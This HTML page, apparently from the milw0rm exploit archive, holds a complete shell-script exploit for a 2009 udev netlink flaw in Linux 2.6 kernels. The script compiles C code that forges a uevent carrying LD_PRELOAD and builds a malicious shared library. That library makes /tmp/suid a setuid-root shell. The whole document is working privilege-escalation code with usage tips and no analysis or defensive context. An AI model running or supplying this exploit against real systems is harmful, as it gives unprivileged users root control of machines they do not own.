<html><head><title>Linux Kernel 2.6 UDEV Local Privilege Escalation Exploit</title></head><pre>#!/bin/sh
# Linux 2.6
# bug found by Sebastian Krahmer
#
# lame sploit using LD technique 
# by kcope in 2009
# tested on debian-etch,ubuntu,gentoo
# do a 'cat /proc/net/netlink'
# and set the first arg to this
# script to the pid of the netlink socket
# (the pid is udevd_pid - 1 most of the time)
# + sploit has to be UNIX formatted text :)
# + if it doesn't work the 1st time try more often
#
# WARNING: maybe needs some FIXUP to work flawlessly
## greetz fly out to alex,andi,adize,wY!,revo,j! and the gang

cat &gt; udev.c &lt;&lt; _EOF
#include &lt;fcntl.h&gt;
#include &lt;stdio.h&gt;
#include &lt;string.h&gt;
#include &lt;stdlib.h&gt;
#include &lt;unistd.h&gt;
#include &lt;dirent.h&gt;
#include &lt;sys/stat.h&gt;
#include &lt;sysexits.h&gt;
#include &lt;wait.h&gt;
#include &lt;signal.h&gt;
#include &lt;sys/socket.h&gt;
#include &lt;linux/types.h&gt;
#include &lt;linux/netlink.h&gt;

#ifndef NETLINK_KOBJECT_UEVENT
#define NETLINK_KOBJECT_UEVENT 15
#endif

#define SHORT_STRING 64
#define MEDIUM_STRING 128
#define BIG_STRING 256
#define LONG_STRING 1024
#define EXTRALONG_STRING 4096
#define TRUE 1
#define FALSE 0

int socket_fd;
struct sockaddr_nl address;
struct msghdr msg;
struct iovec iovector;
int sz = 64*1024;

main(int argc, char **argv) {
        char sysfspath[SHORT_STRING];
        char subsystem[SHORT_STRING];
        char event[SHORT_STRING];
        char major[SHORT_STRING];
        char minor[SHORT_STRING];

        sprintf(event, &quot;add&quot;);
        sprintf(subsystem, &quot;block&quot;);
        sprintf(sysfspath, &quot;/dev/foo&quot;);
        sprintf(major, &quot;8&quot;);
        sprintf(minor, &quot;1&quot;);

        memset(&amp;address, 0, sizeof(address));
        address.nl_family = AF_NETLINK;
        address.nl_pid = atoi(argv[1]);
        address.nl_groups = 0;

        msg.msg_name = (void*)&amp;address;
        msg.msg_namelen = sizeof(address);
        msg.msg_iov = &amp;iovector;
        msg.msg_iovlen = 1;

        socket_fd = socket(AF_NETLINK, SOCK_DGRAM, NETLINK_KOBJECT_UEVENT);
        bind(socket_fd, (struct sockaddr *) &amp;address, sizeof(address));

        char message[LONG_STRING];
        char *mp;

        mp = message;
        mp += sprintf(mp, &quot;%s@%s&quot;, event, sysfspath) +1;
        mp += sprintf(mp, &quot;ACTION=%s&quot;, event) +1;
        mp += sprintf(mp, &quot;DEVPATH=%s&quot;, sysfspath) +1;
        mp += sprintf(mp, &quot;MAJOR=%s&quot;, major) +1;
        mp += sprintf(mp, &quot;MINOR=%s&quot;, minor) +1;
        mp += sprintf(mp, &quot;SUBSYSTEM=%s&quot;, subsystem) +1;
        mp += sprintf(mp, &quot;LD_PRELOAD=/tmp/libno_ex.so.1.0&quot;) +1;

        iovector.iov_base = (void*)message;
        iovector.iov_len = (int)(mp-message);

        char *buf;
        int buflen;
        buf = (char *) &amp;msg;
        buflen = (int)(mp-message);

        sendmsg(socket_fd, &amp;msg, 0);

        close(socket_fd);

	sleep(10);
	execl(&quot;/tmp/suid&quot;, &quot;suid&quot;, (void*)0);
}

_EOF
gcc udev.c -o /tmp/udev
cat &gt; program.c &lt;&lt; _EOF
#include &lt;unistd.h&gt;
#include &lt;stdio.h&gt;
#include &lt;sys/types.h&gt;
#include &lt;stdlib.h&gt;

void _init()
{
 setgid(0);
 setuid(0);
 unsetenv(&quot;LD_PRELOAD&quot;);
 execl(&quot;/bin/sh&quot;,&quot;sh&quot;,&quot;-c&quot;,&quot;chown root:root /tmp/suid; chmod +s /tmp/suid&quot;,NULL);
}

_EOF
gcc -o program.o -c program.c -fPIC
gcc -shared -Wl,-soname,libno_ex.so.1 -o libno_ex.so.1.0 program.o -nostartfiles
cat &gt; suid.c &lt;&lt; _EOF
int main(void) {
       setgid(0); setuid(0);
       execl(&quot;/bin/sh&quot;,&quot;sh&quot;,0); }
_EOF
gcc -o /tmp/suid suid.c
cp libno_ex.so.1.0 /tmp/libno_ex.so.1.0
/tmp/udev $1

# milw0rm.com [2009-04-20]</pre></html>